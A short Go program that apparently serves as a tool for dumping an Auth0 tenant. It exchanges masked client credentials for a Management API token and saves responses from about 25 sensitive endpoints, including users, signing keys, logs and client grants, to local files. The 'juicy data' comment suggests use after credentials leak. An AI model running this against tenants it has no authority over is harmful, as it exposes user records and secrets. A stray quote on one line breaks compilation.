package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

var (
  loginEndpoint = "https://**********.auth0.com"
	clientID      = "***************************"
	clientSecret  = "***************************""
	audience      = "https://**********.auth0.com/api/v2/"
)

// Credentials struct to hold Auth0 credentials
type Credentials struct {
	ClientID     string `json:"client_id"`
	ClientSecret string `json:"client_secret"`
	Audience     string `json:"audience"`
	GrantType    string `json:"grant_type"`
}

// TokenResponse struct to hold token response
type TokenResponse struct {
	AccessToken string `json:"access_token"`
	TokenType   string `json:"token_type"`
	ExpiresIn   int    `json:"expires_in"`
}

// Get JWT Token from Auth0
func generateCreds() (TokenResponse, error) {
	creds := Credentials{
		ClientID:     clientID,
		ClientSecret: clientSecret,
		Audience:     audience,
		GrantType:    "client_credentials",
	}

	body, err := json.Marshal(creds)
	if err != nil {
		return TokenResponse{}, err
	}

	resp, err := http.Post(loginEndpoint+"/oauth/token", "application/json", bytes.NewReader(body))
	if err != nil {
		return TokenResponse{}, err
	}
	defer resp.Body.Close()

	var tokenResp TokenResponse
	if err := json.NewDecoder(resp.Body).Decode(&tokenResp); err != nil {
		return TokenResponse{}, err
	}

	return tokenResp, nil
}

// Jump Juicy Data using JWT token
func dumpInfo(accessToken string) error {
	endpoints := []string{
		"/api/v2/emails/provider",
		"/api/v2/device-credentials",
		"/api/v2/client-grants",
		"/api/v2/branding",
		"/api/v2/blacklists/tokens",
		"/api/v2/attack-protection/breached-password-detection",
		"/api/v2/actions/actions",
		"/api/v2/clients",
		"/api/v2/connections",
		"/api/v2/custom-domains",
		"/api/v2/grants",
		"/api/v2/hooks",
		"/api/v2/keys/signing",
		"/api/v2/log-streams",
		"/api/v2/logs",
		"/api/v2/organizations",
		"/api/v2/prompts",
		"/api/v2/resource-servers",
		"/api/v2/roles",
		"/api/v2/rules",
		"/api/v2/rules-configs",
		"/api/v2/stats/active-users",
		"/api/v2/stats/daily",
		"/api/v2/tenants/settings",
		"/api/v2/users",
	}

	client := &http.Client{}
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("GET", loginEndpoint+endpoint, nil)
		if err != nil {
			return err
		}
		req.Header.Set("Authorization", "Bearer "+accessToken)

		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()

		fmt.Println(resp.StatusCode, endpoint)
		fileName := filepath.Base(endpoint) + ".json"
		file, err := os.Create(fileName)
		if err != nil {
			return err
		}
		defer file.Close()

		_, err = io.Copy(file, resp.Body)
		if err != nil {
			return err
		}
	}

	return nil
}

func main() {
	tokenResp, err := generateCreds()
	if err != nil {
		fmt.Println("Error obtaining access token:", err)
		return
	}

	if err := dumpInfo(tokenResp.AccessToken); err != nil {
		fmt.Println("Error dumping information:", err)
		return
	}

	fmt.Println("Information dumped successfully.")
}
